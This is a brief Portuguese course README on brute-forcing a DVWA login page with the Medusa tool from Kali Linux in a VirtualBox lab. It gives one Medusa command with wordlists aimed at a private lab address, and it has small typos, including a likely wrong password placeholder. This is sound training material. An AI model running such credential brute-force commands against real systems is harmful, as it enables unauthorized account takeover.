# Brute-Force-de-Senhas-com-Medusa-e-Kali-Linux
Curso DIO de segurança

============================================================================================

Plataforma de Virtualização:

Virtual tual BOX

============================================================================================
Sistema SO utilizados:

Kali Linux VirtualBox;

Exemplo de Utilização da Ferramenta Meduza;

Linha de comando:
medusa -h 192.168.56.102 -U user.txt -P pass.txt -M http \
-m page:'/dvwa/login.php' \
-m form:'username=^USER^&password=^pass^&login=login'\
-m 'FAIL=login failed' -t 6








